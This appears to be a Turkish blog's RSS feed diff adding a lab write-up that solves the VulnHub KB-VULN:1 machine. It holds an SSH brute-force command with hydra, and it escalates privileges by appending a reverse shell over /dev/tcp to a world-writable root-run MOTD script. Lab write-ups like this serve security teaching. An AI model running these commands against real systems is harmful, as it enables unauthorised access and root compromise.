@@ -5,8 +5,182 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Tue, 15 Sep 2020 20:03:12 +0300</lastBuildDate>
+        <lastBuildDate>Thu, 17 Sep 2020 20:40:54 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB KB VULN:1 Makinası Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/</link>
+            <pubDate>Thu, 17 Sep 2020 20:40:54 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.  netdiscover -i eth0  Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/kb-vuln-1,540/">VULNHUB</a> &lsquo;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+
+
+<div style="text-align:justify;">
+Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+</div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
+</code></pre></div>
+    <img src="/images/vulnhub/kb-vuln1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
+<p>
+    <img src="/images/vulnhub/kb-vuln1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+Ftp portunda çalışan servisin konfigürasyon ayarları varsayılan olarak bırakıldığı için anonymous erişim açıktır. Ftp servisine bağlanılır ve paylaşıma açık dosyalar incelenir.
+</div>
+
+    <img src="/images/vulnhub/kb-vuln1/ftp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+</p>
+<p><strong>.bash_history</strong> adlı dosya bilgisayara indirilir.</p>
+<p>
+    <img src="/images/vulnhub/kb-vuln1/ftp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+İndirilen dosyanın içeriğine bakıldığından ssh vb. erişimlerde kullanıcıya verilen karşılama mesajının (Günün Mesajı-Message Of The Day(motd)) yer aldığı <i style="color:yellow"> <strong> 00-header </strong></i> dosyasında değişiklik yapıldığı görülmektedir. Yetki yükseltme aşamasında kullanılabilir.
+<br>
+</div>
+
+    <img src="/images/vulnhub/kb-vuln1/file.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+</p>
+<p>Tarayıcı ile web servisine istek atılır. Oneschool adlı bir web sayfası açılmaktadır. Sayfa kaynak kodları incelendiğinde bir kullanıcı adı tespit edilmektedir.</p>
+<p>
+    <img src="/images/vulnhub/kb-vuln1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+<br>
+</div>
+
+    <img src="/images/vulnhub/kb-vuln1/websource.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+Web dizininde gobuser ile dizin taraması gerçekleştirilir. Yapılan dizin ve alt dizin taramalarında ilk erişim için parola yada giriş paneli tespit edilememiştir. Elde edilen kullanıcı adı ile hydra aracı ile ssh servisine brute force saldırı yapılır.
+</div></p>
+<pre><code class="language-terminal" data-lang="terminal">hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
+</code></pre>
+    <img src="/images/vulnhub/kb-vuln1/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Elde edilen parola ile ssh erişimi sağlanır.</p>
+<pre><code class="language-terminal" data-lang="terminal">[barcode@parrot]─[~]$ ssh sysadmin@192.168.56.102
+The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
+ECDSA key fingerprint is SHA256:9z5jY109u48eo71sMGnTp9s13QY0KGVMI9B/m2mkCZs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts.
+sysadmin@192.168.56.102's password: 
+
+			WELCOME TO THE KB-SERVER
+
+Last login: Sat Aug 22 18:00:48 2020
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+sysadmin@kb-server:~$
+</code></pre><p>sysadmin kullanıcısına ait home dizininde yer alan dosyalar listelenir ve user.txt dosyası okunarak ilk flag elde edilir.</p>
+
+    <img src="/images/vulnhub/kb-vuln1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>İlk olarak <em><strong>/etc/update-motd.d/</strong></em> dizinine gidilir ve 00-header dosyasının izinleri kontrol edilir.</p>
+<pre><code class="language-terminal" data-lang="terminal">sysadmin@kb-server:~$ cd /etc/update-motd.d/
+sysadmin@kb-server:/etc/update-motd.d$ ls -lsa
+total 16
+4 drwxr-xr-x  3 root root 4096 Aug 22 17:08 .
+4 drwxr-xr-x 92 root root 4096 Sep 11 08:24 ..
+4 -rwxrwxrwx  1 root root  989 Aug 22 17:08 00-header
+4 drwxr-xr-x  2 root root 4096 Aug 22 17:07 other
+</code></pre><p>00-header dosyasında tüm kullanıcılara yazma yetkisi verildiği görülmektedir. Normal kullanımda bu yetki sadece root yetkisinde olmaktadır. Dosya içeriği görüntülenir.</p>
+
+    <img src="/images/vulnhub/kb-vuln1/header1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Ssh erişiminde çalışan dosyanın hangi kullanıcı yetkisi ile çalıştırıldığının tespiti için whoami komutu eklenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;whoami&#34;</span> &gt;&gt; 00-header
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysadmin@kb-server:/etc/update-motd.d$ cat 00-header 
+<span style="color:#75715e">#!/bin/sh</span>
+#
+<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
+<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
+#
+<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
+#
+<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
+<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
+<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
+<span style="color:#75715e">#    (at your option) any later version.</span>
+#
+<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
+<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
+<span style="color:#75715e">#    GNU General Public License for more details.</span>
+#
+<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
+<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
+<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+
+<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release
+
+echo <span style="color:#e6db74">&#34;\n\t\t\tWELCOME TO THE KB-SERVER\n&#34;</span>
+whoami
+</code></pre></div><p>Ssh bağlantısı kesilip tekrardan erişim sağlandığında 00-header dosyası içerisinde çalıştırılan dosyaların root yetkisi ile çalıştırıldığı görülmektedir.</p>
+<pre><code class="language-terminal" data-lang="terminal">sysadmin@192.168.56.102's password: 
+
+			WELCOME TO THE KB-SERVER
+
+root &lt;--- Eklenen komut Çıktısı
+Last login: Thu Sep 17 19:06:26 2020 from 192.168.56.1
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+</code></pre><p>Yüksek yetki ile shell bağlantısı sağlamak için 00-header dosyasına aşağıda yer alan komut eklenir ve tekrar erişim sağlanıldığında 4444 numaralı porta shell bağlantısı düşmektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.101/4444 &lt;&amp;1&#39;&#34;</span> &gt;&gt; 00-header 
+</code></pre></div>
+    <img src="/images/vulnhub/kb-vuln1/header2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+<br>
+</div>
+
+    <img src="/images/vulnhub/kb-vuln1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+<br>
+Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamamlanır.
+
+</div>
+
+    <img src="/images/vulnhub/kb-vuln1/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>THM CMess Write Up</title>
